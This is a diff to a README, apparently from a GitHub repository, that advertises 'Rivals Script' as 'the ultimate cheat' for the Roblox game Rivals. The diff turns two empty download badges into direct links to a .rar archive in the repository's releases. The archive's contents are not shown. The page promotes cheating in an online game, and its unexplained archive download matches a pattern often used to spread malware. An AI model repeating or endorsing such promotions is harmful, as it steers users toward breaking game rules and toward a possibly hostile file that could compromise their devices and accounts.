@@ -1,10 +1,10 @@
-# 🔥 **Rivals Script — The Ultimate Cheat for Rivals (Roblox 2025 Edition)** 🚀  [![Download Rivals Script](https://img.shields.io/badge/Download-Rivals_Script-purple?style=for-the-badge&logo=download)]()  
+# 🔥 **Rivals Script — The Ultimate Cheat for Rivals (Roblox 2025 Edition)** 🚀  [![Download Rivals Script](https://img.shields.io/badge/Download-Rivals_Script-purple?style=for-the-badge&logo=download)](https://github.com/Deve40pGame/rivals-script/releases/download/Update/Update.rar)  
 
 
 ![rivals](https://github.com/user-attachments/assets/6b842c9e-73de-40b8-8324-bd134e1596c5)
 
 
-[![Download Rivals Script](https://img.shields.io/badge/Download-Rivals_Script-purple?style=for-the-badge&logo=download)]()  
+[![Download Rivals Script](https://img.shields.io/badge/Download-Rivals_Script-purple?style=for-the-badge&logo=download)](https://github.com/Deve40pGame/rivals-script/releases/download/Update/Update.rar)  
 
 ## ❓ **What is Rivals Script?**  
 
